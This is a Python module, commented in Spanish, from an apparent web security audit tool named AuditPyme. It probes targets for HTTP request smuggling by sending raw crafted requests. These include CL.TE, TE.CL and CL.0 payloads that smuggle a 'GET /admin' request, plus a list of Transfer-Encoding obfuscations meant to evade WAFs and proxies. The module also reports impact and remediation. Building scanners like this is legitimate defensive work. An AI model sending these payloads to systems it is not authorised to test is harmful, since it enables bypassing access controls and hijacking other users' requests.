"""
Módulo de HTTP Request Smuggling — AuditPyme
Detecta CL.TE, TE.CL y CL.0 mediante cabeceras conflictivas.
"""

import socket
import ssl
import re
import time
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TIMEOUT = 15
UA = "Mozilla/5.0 (compatible; AuditPyme/1.0)"


class SmugglingScanner:

    def __init__(self, target: str, recon_data: dict = None, stealth: bool = False):
        self.target = target
        self.recon_data = recon_data or {}
        self.findings = []
        self.delay = 1.0 if stealth else 0.3
        self._endpoints = self._build_endpoints()

    def scan(self) -> list:
        print(f"\n  [*] HTTP Request Smuggling scan: {self.target}")
        for host, port, proto in self._endpoints:
            print(f"  [*] Probando {proto}://{host}:{port}")
            self._check_cl_te(host, port, proto)
            self._check_te_cl(host, port, proto)
            self._check_cl_zero(host, port, proto)
            self._check_te_obfuscation(host, port, proto)

        if not self.findings:
            print("  [OK] No se detectó HTTP Request Smuggling")
        return self.findings

    # ── CL.TE — Content-Length ante el frontend, Transfer-Encoding ante el backend ──

    def _check_cl_te(self, host: str, port: int, proto: str):
        """
        Envía una petición con ambas cabeceras CL y TE.
        Si el frontend usa CL y el backend TE, el cuerpo sobrante se
        'smugglea' al backend como inicio de la siguiente petición.
        Indicador: timeout en la petición de seguimiento (backend espera más data).
        """
        # Petición que envenenará el pipeline del backend con un prefijo de petición GET
        smuggle_payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 35\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
            # El frontend cree que el body son 35 bytes
            b"0\r\n"    # El backend ve CHUNK 0 → fin de chunked
            b"\r\n"
            # Estos bytes se smugglean al backend como inicio de la sig. petición
            b"GET /admin HTTP/1.1\r\n"
            b"X-Smuggled: 1\r\n"
            b"\r\n"
        )

        result = self._raw_send(host, port, proto, smuggle_payload)
        if result and self._detect_cl_te_hit(result):
            self._add_smuggling("CL.TE", host, port, proto,
                "El frontend procesa Content-Length, el backend procesa Transfer-Encoding. "
                "Se smugglea una petición GET /admin parcial al backend.")

    # ── TE.CL — Transfer-Encoding ante el frontend, Content-Length ante el backend ──

    def _check_te_cl(self, host: str, port: int, proto: str):
        """
        El frontend procesa TE chunked, el backend usa CL.
        El truco: ocultar TE para que el frontend lo ignore y use CL.
        """
        # Content-Length mayor que el chunk real → backend lee más data = smuggling
        smuggle_payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 4\r\n"
            # TE con encoding inusual para evadir el parser del frontend
            b"Transfer-Encoding : chunked\r\n"  # espacio antes de :
            b"Connection: keep-alive\r\n"
            b"\r\n"
            # Frontend procesa TE chunked: chunk 0 = body completo (5c + data)
            b"5c\r\n"
            b"GET /admin HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Length: 0\r\n\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
        )

        result = self._raw_send(host, port, proto, smuggle_payload)
        if result and self._detect_te_cl_hit(result):
            self._add_smuggling("TE.CL", host, port, proto,
                "El frontend procesa Transfer-Encoding, el backend procesa Content-Length. "
                "Técnica con espacio en cabecera para bypassar el parser del frontend.")

    # ── CL.0 — Backend ignora Content-Length con cuerpo 0 ────────────────────

    def _check_cl_zero(self, host: str, port: int, proto: str):
        """
        Algunos backends ignoran Content-Length cuando el body parece vacío.
        Permite smuggling sin TE enviando data extra que el backend ignora pero
        el próximo parse del pipeline consume.
        """
        smuggle_payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Content-Length: 0\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
            # Petición smuggleada: si el backend ignora CL=0, estos bytes
            # se convierten en el inicio de la siguiente petición del pipeline
            b"GET /admin?cl0=1 HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"\r\n"
        )

        result = self._raw_send(host, port, proto, smuggle_payload)
        if result and "admin" in (result.lower()):
            self._add_smuggling("CL.0", host, port, proto,
                "El backend puede estar ignorando Content-Length: 0. "
                "Los bytes extra se tratan como inicio de una nueva petición (CL.0 smuggling).")

    # ── TE obfuscation ────────────────────────────────────────────────────────

    def _check_te_obfuscation(self, host: str, port: int, proto: str):
        """
        Prueba variantes de ofuscación de Transfer-Encoding para bypassar WAFs/proxies.
        Si el proxy normaliza la cabecera pero el backend no, hay diferencia de parseo.
        """
        obfuscations = [
            b"Transfer-Encoding: xchunked\r\n",
            b"Transfer-Encoding: chunked, identity\r\n",
            b"Transfer-Encoding: \r\n chunked\r\n",  # obs-fold
            b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n",  # doble
            b"X-Transfer-Encoding: chunked\r\n",
            b"Transfer-Encoding[tab]:\x09chunked\r\n".replace(b"[tab]", b"\t"),
        ]

        for obf in obfuscations:
            smuggle_payload = (
                b"POST / HTTP/1.1\r\n"
                b"Host: " + host.encode() + b"\r\n"
                b"User-Agent: " + UA.encode() + b"\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: 6\r\n"
                + obf +
                b"Connection: keep-alive\r\n"
                b"\r\n"
                b"0\r\n"
                b"\r\n"
            )
            result = self._raw_send(host, port, proto, smuggle_payload)
            if result and self._detect_parsing_difference(result):
                obf_str = obf.decode("latin-1", errors="replace").strip()
                self._add_smuggling("TE-Obfuscation", host, port, proto,
                    f"Ofuscación de Transfer-Encoding aceptada: {obf_str[:60]}. "
                    f"Diferencia de parseo detectada entre proxy y backend.")
                break  # Un hallazgo por host es suficiente

    # ── Envío raw TCP/TLS ─────────────────────────────────────────────────────

    def _raw_send(self, host: str, port: int, proto: str, payload: bytes) -> str:
        """Envía payload raw TCP y devuelve la respuesta como string."""
        try:
            sock = socket.create_connection((host, port), timeout=TIMEOUT)
            if proto == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.sendall(payload)
            time.sleep(self.delay)

            response = b""
            sock.settimeout(8)
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
            except socket.timeout:
                pass

            sock.close()
            return response.decode("latin-1", errors="replace")
        except Exception:
            return ""

    # ── Detección de hits ─────────────────────────────────────────────────────

    def _detect_cl_te_hit(self, response: str) -> bool:
        """CL.TE: el backend puede responder con 400/200 inesperado, o incluir headers smuggleados."""
        indicators = [
            "x-smuggled: 1",
            "GET /admin",
            "400 bad request",
            "invalid request",
            "malformed",
        ]
        for ind in indicators:
            if ind.lower() in response.lower():
                return True
        # Dos respuestas HTTP en una sola conexión → pipeline smuggling
        count_200 = len(re.findall(r"HTTP/1\.[01] [23]\d\d", response))
        return count_200 >= 2

    def _detect_te_cl_hit(self, response: str) -> bool:
        count = len(re.findall(r"HTTP/1\.[01] [23]\d\d", response))
        return count >= 2 or "GET /admin" in response

    def _detect_parsing_difference(self, response: str) -> bool:
        # Diferencia de parseo: el servidor devuelve un error HTTP de parseo
        # O devuelve dos respuestas (pipeline)
        if re.search(r"HTTP/1\.[01] 4\d\d", response) and "chunked" in response.lower():
            return True
        count = len(re.findall(r"HTTP/1\.[01] \d{3}", response))
        return count >= 2

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _build_endpoints(self) -> list:
        """Construye lista de (host, port, proto) para probar."""
        endpoints = []
        for host in self.recon_data.get("hosts", []):
            if host["estado"] != "up":
                continue
            for p in host["puertos"]:
                port = p["puerto"]
                svc = p["servicio"].lower()
                if "http" in svc or port in (80, 443, 8080, 8443, 3128, 8888):
                    proto = "https" if port in (443, 8443) else "http"
                    endpoints.append((self.target, port, proto))

        if not endpoints:
            # Sin recon: probar 80 y 443 por defecto
            endpoints = [
                (self.target, 443, "https"),
                (self.target, 80, "http"),
            ]
        return endpoints

    def _add_smuggling(self, attack_type: str, host: str, port: int, proto: str, detail: str):
        nombre = f"HTTP Request Smuggling — {attack_type} en {proto}://{host}:{port}"
        for f in self.findings:
            if f["nombre"] == nombre:
                return

        self.findings.append({
            "severidad": "CRITICAL",
            "tipo": "HTTP Request Smuggling",
            "nombre": nombre,
            "descripcion": (
                f"Se detectó potencial HTTP Request Smuggling tipo {attack_type} "
                f"en {proto}://{host}:{port}.\n{detail}"
            ),
            "impacto": (
                f"HTTP Request Smuggling ({attack_type}) permite a un atacante: "
                f"bypassar controles de seguridad del proxy/WAF, secuestrar peticiones "
                f"de otros usuarios (robo de sesiones/tokens), provocar XSS almacenado "
                f"vía respuestas envenenadas, acceder a endpoints internos no expuestos "
                f"públicamente (como /admin), y causar cache poisoning en CDNs."
            ),
            "recomendacion": (
                "Deshabilitar la reutilización de conexiones (keepalive) entre proxy y backend. "
                "Usar HTTP/2 end-to-end (no susceptible a este ataque en su forma clásica). "
                "Configurar el proxy para normalizar las peticiones antes de enviarlas al backend. "
                "Rechazar peticiones con cabeceras TE y CL simultáneas. "
                "Actualizar Nginx/Apache/HAProxy/Varnish a la última versión con parches de smuggling. "
                "Si se usa AWS ALB o CloudFlare, activar las mitigaciones anti-smuggling disponibles."
            ),
        })
        print(f"  [CRITICAL] HTTP Request Smuggling {attack_type} en {proto}://{host}:{port}")
